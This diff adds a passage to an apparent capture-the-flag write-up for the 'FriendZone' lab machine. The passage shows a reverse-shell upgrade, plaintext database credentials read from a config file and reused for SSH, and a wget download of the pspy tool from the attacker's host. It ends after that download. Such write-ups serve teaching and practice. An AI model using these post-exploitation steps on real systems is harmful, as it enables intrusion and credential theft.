@@ -183,3 +183,66 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 ```
+This next step is not necessary but I did it just to give myself a more responsive shell
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@FriendZone:/$ ^Z
+[1]+  Stopped                 nc -lvnp 10000
+# stty raw -echo; fg
+nc -lvnp 10000
+
+www-data@FriendZone:/$
+```
+Now we have a shell with tab complete. At this point you can go to <b>/home/friend/</b> and read the <b>user.txt</b> file. I do some basic enumeration and eventually find a <b>mysql_data.conf</b> in <b>/var/www</b>.
+```
+ls /var/www
+admin       friendzoneportal       html             uploads
+friendzone  friendzoneportaladmin  mysql_data.conf
+```
+If we read the file we see some credentials.
+```
+# cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+```
+Even though the credentials say they are for a mysql database I decided to try them in ssh. Turns out they worked.
+```
+# ssh friend@10.10.10.123
+The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
+ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
+friend@10.10.10.123's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+You have mail.
+Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
+friend@FriendZone:~$
+```
+I first ran some Enum scripts but didnt get much from them so I decided to use an tool called <b>pspy</b>. I copied the file over to the box using a <b>python SimpleHTTPServer</b>. I start the server on my host machine in the same directory as <b>pspy</b>.
+```
+# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Then I use <b>wget</b> on the box to download it.
+```
+friend@FriendZone:/tmp$ wget 10.10.14.21/pspy64                                                       
+--2019-09-19 21:58:12--  http://10.10.14.21/pspy64                                                    
+Connecting to 10.10.14.21:80... connected.                                                            
+HTTP request sent, awaiting response... 200 OK                                                        
+Length: 4468984 (4.3M) [application/octet-stream]                                                     
+Saving to: ‘pspy64’                                                                                   
+
+pspy64                    100%[===================================>]   4.26M   291KB/s    in 19s      
+
+2019-09-19 21:58:31 (233 KB/s) - ‘pspy64’ saved [4468984/4468984]                                     
+```
